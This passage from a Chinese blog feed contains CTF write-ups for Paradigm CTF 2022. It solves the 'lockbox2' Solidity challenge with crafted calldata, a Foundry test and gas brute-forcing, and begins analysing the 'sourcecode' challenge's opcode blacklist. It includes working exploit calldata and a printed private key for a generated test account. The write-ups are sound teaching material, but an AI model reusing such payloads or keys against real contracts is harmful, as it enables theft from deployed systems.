class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>assembly &#123; mstore(a, b) &#125;</code>：将内存位置a之后的32字节的值设置为b，暂时没啥用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mstore(p,v): mem[p..(p+32)] := v</span><br><span class="line">| offset | value | ===&gt; </span><br><span class="line">memory[offset:offset+32] = value</span><br><span class="line">writes a (u)int256 to memory</span><br></pre></td></tr></table></figure></li><li><p><code>(bool success, bytes memory data) = address(uint160(a + b)).staticcall(&quot;&quot;);</code></p><ul><li>将a和b的和作为地址，然后进行<code>staticcall()</code>，由于stage2的限制，a和b必须尽可能的小，因此a加b所得到的地址也会很小，那么就会得到一个包含很多0的地址。由于这样的地址用CREATE2几乎不可能做到，因此此地址包含的code一定是空的，返回来的值一定为：success=true，data=空。</li></ul></li><li><p><code>require(success &amp;&amp; data.length == c);</code></p><ul><li><p>success一定为true，没问题。</p></li><li><p>因为data一定为空，因此data.length一定为0，此时c的值就只能为0。但是0不是素数，因此无法通过条件2，我们必须做些什么。</p><ol><li><p>注意到，stage3包含了内联汇编，并且有mstore可以操作内存中的数值，我们还得知道，solidity保留了 4 个 32 字节槽，其中一个32字节槽为<code>0x60 - 0x7f</code>，这个槽位用来定义程序的 “零” 是什么，也就是说程序如果返回 “零”值，那么回到这个槽来取值，默认情况下 ”零“的值为0。</p></li><li><p>知道了这些，我们可以这么操作：当<code>staticcall()</code>返回 “零“值的时候，回到内存<code>0x60 - 0x7f</code>的位置去取值，如果我们将<code>0x60 - 0x7f</code>的值修改为一个数X，c的值也设置为X，那么就可以通过检验了！同时因为c要尽可能的小，<code>0x60 - 0x7f</code>的值要尽可能小</p></li><li><p>让我们开始操作：输入的a、b、c必须是素数，a是存入内存的位置，并且操作的大小为32字节，那么能操作到 “零“值的a范围是：( 0x60-0x20, 0x7f   ]，也就是( 0x40,  0x7f ]，其中可用的素数为43,47,47,4f,53,59,61,65,67,6b,6d,71,7f。同时设置的值b是32字节的低位，如图，比如用操作内存0x61的位置，那么在0x80那一段就会多出来一部分，b从蓝色部分开始往前开始存储。从图里面可用看出，如果a太小，就会是覆盖方式1，这就会操作 “零”值特别大，也就是c要特别大，不行；如果a太大，就会是覆盖方式2，这样就需要b要特别大才能触碰到0x60~0x7f的位置修改 ”零“值。因此，a和b的值要选择好，不大也不小</p><p><img src="https://moe.photo/images/2023/07/26/image-20230726202344974.png" alt></p></li><li><p>最终，我们选择了这样一个值：a=0x61，b=0x0101。此时内存中的结果为如下。这样，我们就做到了a为0x61, b为0x0101，c为0x01，都不大，都为素数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0x60~0x7f]0000000000000000000000000000000000000000000000000000000000000001 </span><br><span class="line">[0x80~0x9f]0100000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure></li></ol></li></ul></li></ul><p>因此，此时输入的<code>solve()函数选择器 + msg.data</code>暂时为如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">890d6908 // 函数选择器</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000061 // 00</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000101 // 20</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001 // 40</span><br></pre></td></tr></table></figure><h4 id="2-4stage4"><a href="#2-4stage4" class="headerlink" title="2.4stage4"></a>2.4stage4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function stage4(bytes memory a, bytes memory b) external &#123;</span><br><span class="line">    address addr;</span><br><span class="line">    assembly &#123; addr := create(0, add(a, 0x20), mload(a)) &#125;</span><br><span class="line">    (bool success, ) = addr.staticcall(b);</span><br><span class="line">    require(tx.origin == address(uint160(uint256(addr.codehash))) &amp;&amp; success);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分析代码<ul><li><code>assembly &#123; addr := create(0, add(a, 0x20), mload(a)) &#125;</code>：输入a作为bytecode来创建一个合约</li><li><code>(bool success, ) = addr.staticcall(b);</code>：将b输入到该合约，结合下一行代码可知必须执行成功</li><li><code>require(tx.origin == address(uint160(uint256(addr.codehash))) &amp;&amp; success);</code>：输入该合约的bytecode经过哈希之后，要等于调用此方法的EOA账户。由此可知，我们部署的bytecode也就是a，必须是消息调用者的公钥，因为公钥经过hash之后才会等于tx.origin地址。但是由于上一步<code>staticcall()</code>，他会执行runtimecode，如果我们无法控制runtimecode，就会乱执行，很可能调用失败，所以对bytecode要一定要求。有一个很好的想法，我们可以选择00开头的runtimecode，因为00是STOP的操作码，执行了就成功执行并退出了，那么我们的bytecode（也就是initCode）的工作就是返回这个符合要求的runtimecode</li><li>所以我们需要做的就是生成一个EOA账户，其公钥是00开头，一个合适的bytecode，然后用这个账户进行调用该方法</li></ul></li></ul><p>我们用下面的代码可以生成我们想要的EOA账户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> ecdsa</span><br><span class="line"></span><br><span class="line">g = ecdsa.generator_secp256k1</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    private_key = random.randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">256</span> - <span class="number">1</span>)</span><br><span class="line">    public_key = private_key * g</span><br><span class="line">    x = <span class="built_in">str</span>(<span class="built_in">hex</span>(public_key.x())[<span class="number">2</span>:])</span><br><span class="line">    x = (<span class="string">&quot;00&quot;</span> * <span class="number">32</span> + x)[-<span class="number">32</span> * <span class="number">2</span>:]</span><br><span class="line">    y = <span class="built_in">str</span>(<span class="built_in">hex</span>(public_key.y())[<span class="number">2</span>:])</span><br><span class="line">    y = (<span class="string">&quot;00&quot;</span> * <span class="number">32</span> + y)[-<span class="number">32</span> * <span class="number">2</span>:]</span><br><span class="line">    public_key_hex = x + y</span><br><span class="line">    <span class="keyword">if</span> public_key_hex[:<span class="number">2</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;private_key&quot;</span>,private_key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;public_key_hex&quot;</span>,public_key_hex)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后我执行的结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private_key 53696799650805905702178748833560284763518490362681353450771033938641345485772</span><br><span class="line">public_key_hex 00c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf5</span><br></pre></td></tr></table></figure><p>最后，我们就可以构造bytecode了，作用是将我们的公钥返回，思路大概如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x40              6040</span><br><span class="line">DUP1                    80</span><br><span class="line">PUSH1 0x0b              600B</span><br><span class="line">PUSH1 0x0               6000</span><br><span class="line">CODECOPY                39</span><br><span class="line">PUSH1 0                 6000</span><br><span class="line">RETURN                  f3</span><br></pre></td></tr></table></figure><p>得到<code>604080600B6000396000f3</code>，然后拼接我们的公钥，最终bytecode为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf5</span><br></pre></td></tr></table></figure><p>让我们看回我们构造的msg.data，意思是会到内存61的位置选取32字节的内容作为数据长度，然后再获取这个长度的实际数据，由于这个位置也需要是一个合适的素数，因此我们将其[ // 60 ]设置为1，那么选取32字节的数据长度就是0x100，也就是256字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">890d6908 // 函数选择器</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000061 // 00</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000101 // 20</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001 // 40</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001 // 60</span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>然后拼接我们的bytecode，因为要256字节，所以后面补0即可。因此，此时输入的<code>solve()函数选择器 + msg.data</code>暂时为如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">890d6908 // 函数选择器</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000061 // 00</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000101 // 20</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001 // 40</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001 // 60</span><br><span class="line">00</span><br><span class="line">// bytecode</span><br><span class="line">604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf5</span><br><span class="line">// 补0</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><h4 id="2-5stage5"><a href="#2-5stage5" class="headerlink" title="2.5stage5"></a>2.5stage5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function stage5() external &#123;</span><br><span class="line">       if (msg.sender != address(this)) &#123;</span><br><span class="line">           (bool success,) = address(this).call(abi.encodePacked(this.solve.selector, msg.data[4:]));</span><br><span class="line">           require(!success);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>意思是会回调当前合约的solve函数，但要返回失败，即：第一遍成功，第二遍失败。由于只能在本合约中操作，无法通过我们自己的合约进行控制，那么我们只可以用gas限制这个土方法，那么需要寻找一个合适的gas。同时，我们的<code>solve()函数选择器 + msg.data</code>就已经确定下来了，就是stage4的那个，此stage5只是要找一个合适的gas，不会影响我们的calldata。</p><p>我们可以在执行前后看看花了多少gas</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function test_isSolved() public&#123;</span><br><span class="line">    console.log(lockbox2.locked());</span><br><span class="line">    // 用私钥选择msg.sender</span><br><span class="line">    vm.startBroadcast(53696799650805905702178748833560284763518490362681353450771033938641345485772);</span><br><span class="line">    </span><br><span class="line">    console.log(gasleft());    </span><br><span class="line">    address(lockbox2).call(hex&quot;890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;);</span><br><span class="line">    console.log(gasleft());  </span><br><span class="line">    console.log(lockbox2.locked());</span><br><span class="line">    vm.stopBroadcast();</span><br><span class="line">    assertEq(level.isSolved(),true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果，相减得到差值，知道花了315585</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9223372036854741483 - 9223372036854425898 = 315585</span><br></pre></td></tr></table></figure><p>那么接下来爆破，我们操作这个最多花315585，并且选取一个gas否则我怕第一次调用<code>solve()</code>都不成功，200000试试看，当然更小可以，只是爆破时间更长：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function test_isSolved() public&#123;</span><br><span class="line">    console.log(lockbox2.locked());</span><br><span class="line">    // 用私钥选择msg.sender</span><br><span class="line">    vm.startBroadcast(53696799650805905702178748833560284763518490362681353450771033938641345485772);</span><br><span class="line">    for(uint i = 200000; i &lt;= 315585;i++)&#123;</span><br><span class="line">        address(lockbox2).call&#123;gas:i&#125;(hex&quot;890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;);</span><br><span class="line"></span><br><span class="line">        if(lockbox2.locked()== false)&#123;</span><br><span class="line">            emit log_uint(i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    console.log(lockbox2.locked());</span><br><span class="line">    vm.stopBroadcast();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破出结果：289126</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function test_isSolved() public&#123;</span><br><span class="line">    console.log(lockbox2.locked());</span><br><span class="line">    // 用私钥选择msg.sender</span><br><span class="line">    vm.startBroadcast(53696799650805905702178748833560284763518490362681353450771033938641345485772);</span><br><span class="line">    </span><br><span class="line">    address(lockbox2).call&#123;gas:289126&#125;(hex&quot;890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;);</span><br><span class="line">    console.log(lockbox2.locked());</span><br><span class="line">    vm.stopBroadcast();</span><br><span class="line">    assertEq(level.isSolved(),true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>calldata</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Setup.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract lockbox2Test is Test&#123;</span><br><span class="line"></span><br><span class="line">    Setup level;</span><br><span class="line">    Lockbox2 lockbox2;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        level = new Setup();</span><br><span class="line">        lockbox2 = level.lockbox2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // function test_isSolved() public&#123;</span><br><span class="line">    //     console.log(lockbox2.locked());</span><br><span class="line">    //     // 用私钥选择msg.sender</span><br><span class="line">    //     vm.startBroadcast(53696799650805905702178748833560284763518490362681353450771033938641345485772);</span><br><span class="line">    //     for(uint i = 200000; i &lt;= 315585;i++)&#123;</span><br><span class="line">    //         address(lockbox2).call&#123;gas:i&#125;(hex&quot;890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;);</span><br><span class="line"></span><br><span class="line">    //         if(lockbox2.locked()== false)&#123;</span><br><span class="line">    //             emit log_uint(i);</span><br><span class="line">    //             break;</span><br><span class="line">    //         &#125;</span><br><span class="line"></span><br><span class="line">    //     &#125;</span><br><span class="line">    //     console.log(lockbox2.locked());</span><br><span class="line">    //     vm.stopBroadcast();</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    function test_isSolved() public&#123;</span><br><span class="line">        console.log(lockbox2.locked());</span><br><span class="line">        // 用私钥选择msg.sender</span><br><span class="line">        vm.startBroadcast(53696799650805905702178748833560284763518490362681353450771033938641345485772);</span><br><span class="line">        </span><br><span class="line">        address(lockbox2).call&#123;gas:289126&#125;(hex&quot;890d6908000000000000000000000000000000000000000000000000000000000000006100000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100604080600B6000396000f300c71a98df7527e420247f8e4baa7a5e8c66108c63107c3d1c9a4cf49574cffc4f37e410c847198bafb557e5fe8ba61fa1b61a55724ebac021acf438a3961cf500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;);</span><br><span class="line">        console.log(lockbox2.locked());</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">        assertEq(level.isSolved(),true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.sourcecode</title>
      <link href="/2023/09/18/14.Paradigm%20CTF%202022/06.sourcecode/"/>
      <url>/2023/09/18/14.Paradigm%20CTF%202022/06.sourcecode/</url>
      
        <content type="html"><![CDATA[<h1 id="sourcecode"><a href="#sourcecode" class="headerlink" title="sourcecode"></a>sourcecode</h1><p>本题需要用到：<a href="https://www.evm.codes/playground?fork=shanghai">https://www.evm.codes/playground?fork=shanghai</a> 和 <a href="https://www.evm.codes/">https://www.evm.codes/</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-任务"><a href="#1-任务" class="headerlink" title="1.任务"></a>1.任务</h3><p>我们的任务是调用<code>isSolved()</code>返回true，其实也就是让challeng合约的<code>solve()</code>返回true。</p><h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h3><h4 id="2-1寻找突破点"><a href="#2-1寻找突破点" class="headerlink" title="2.1寻找突破点"></a>2.1寻找突破点</h4><p>来好好分析一下<code>solve()</code>方法：</p><ul><li><code>require(code.length &gt; 0);</code>：输入的形参长度要大于0</li><li><code>require(safe(code), &quot;deploy/code-unsafe&quot;);</code>：调用safe()的返回结果为true</li><li><code>address target = address(new Deployer(code));</code>：用形参部署一个新的合约Deployer</li><li><code>(bool ok, bytes memory result) = target.staticcall(&quot;&quot;);</code>：调用新合约的方法，输入啥也没有，换句话说，就是输入任何内容返回结果都一样</li><li>require<ul><li>ok：调用一定要成功</li><li><code>keccak256(code) == target.codehash</code>：要为true，意思是<code>solve()</code>输入的形参内容的哈希值必须要和新合约的runtimecode哈希值一样，也就是说<code>solve()</code>输入的形参内容就是新合约的runtimecode</li><li><code>keccak256(result) == target.codehash</code>：调用新合约返回来结果的哈希值必须要和新合约的runtimecode哈希值一样，也就是说新合约返回来结果就是新合约的runtimecode</li></ul></li></ul><p>总结一下：输入的内容 = 新合约的runtimecode = 任何调用新合约的返回值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function solve(bytes memory code) external &#123;</span><br><span class="line">    require(code.length &gt; 0);</span><br><span class="line">    require(safe(code), &quot;deploy/code-unsafe&quot;);</span><br><span class="line">    address target = address(new Deployer(code));</span><br><span class="line">    (bool ok, bytes memory result) = target.staticcall(&quot;&quot;);</span><br><span class="line">    require(</span><br><span class="line">        ok &amp;&amp;</span><br><span class="line">        keccak256(code) == target.codehash &amp;&amp;</span><br><span class="line">        keccak256(result) == target.codehash</span><br><span class="line">    );</span><br><span class="line">    solved = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要做到【输入的内容 = 新合约的runtimecode = 任何调用新合约的返回值】其实并不难，也就是执行一段bytecode，执行完返回的结果还是bytecode本身。但是有个限制：<code>safe()</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function safe(bytes memory code) private pure returns (bool) &#123;</span><br><span class="line">        uint i = 0;</span><br><span class="line">        while (i &lt; code.length) &#123;</span><br><span class="line">            uint8 op = uint8(code[i]); </span><br><span class="line">            // 以下操作码不可用</span><br><span class="line">            if (op &gt;= 0x30 &amp;&amp; op &lt;= 0x48) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            // 除了0x30~0x48的一些操作码，下面这些操作码也不可以用</span><br><span class="line">            if (</span><br><span class="line">                   op == 0x54 // SLOAD</span><br><span class="line">                || op == 0x55 // SSTORE</span><br><span class="line">                || op == 0xF0 // CREATE</span><br><span class="line">                || op == 0xF1 // CALL</span><br><span class="line">                || op == 0xF2 // CALLCODE</span><br><span class="line">                || op == 0xF4 // DELEGATECALL</span><br><span class="line">                || op == 0xF5 // CREATE2</span><br><span class="line">                || op == 0xFA // STATICCALL</span><br><span class="line">                || op == 0xFF // SELFDESTRUCT</span><br><span class="line">            ) return false;</span><br><span class="line">            // 如果操作码是0x60~0x7f，那么判断的位置i就可以向前推进</span><br><span class="line">            // 似乎可以跳过一些判断？意思是bytecode某些位置可以包含这些黑名单操作码？</span><br><span class="line">            // 只要这些黑名单操作码位于操作码0x60~0x7f后面的适当位置</span><br><span class="line">            if (op &gt;= 0x60 &amp;&amp; op &lt; 0x80) i += (op - 0x60) + 1;</span><br><span class="line">            </span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看得出来，<code>safe()</code>对输入的形参做出了一些限制：bytecode不能包含一些字符，也就是说不得包含一些特定的操作码，然而这些操作码是可以很容易做到【输入的内容 = 新合约的runtimecode = 任何调用新合约的返回值】。那么题目的意思就是让我们只能用其他操作码来做到这件事（我不考虑0x60~0x7f，这样问题更加复杂了，我们就单纯用黑名单之外的操作码做题），刁难我们！</p><h4 id="2-2构造bytecode"><a href="#2-2构造bytecode" class="headerlink" title="2.2构造bytecode"></a>2.2构造bytecode</h4><p>我们来看看我们可以用哪些操作码：如下。也就是说，我们要利用下面这些操作码来实现题目的要求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">算数：加减乘除</span><br><span class="line">STOP  ADD  MUL  SUB  DIV  SDIV  MOD  SMOD  ADDMOD  MULMOD  EXP  SIGNEXTEND</span><br><span class="line"></span><br><span class="line">比较</span><br><span class="line">LT  GT  SLT  SGT  EQ  ISZERO</span><br><span class="line"></span><br><span class="line">转换、移位</span><br><span class="line">AND  OR  XOR  NOT  BYTE  SHL  SHR  SAR</span><br><span class="line"></span><br><span class="line">内存</span><br><span class="line">MLOAD  MSTORE  MSTORE8  MSIZE  PUSH?  DUP?  SWAP?</span><br><span class="line"></span><br><span class="line">跳转</span><br><span class="line">JUMP  JUMPI  JUMPDEST</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line">SHA3  POP  PC  GAS LOG?  RETURN  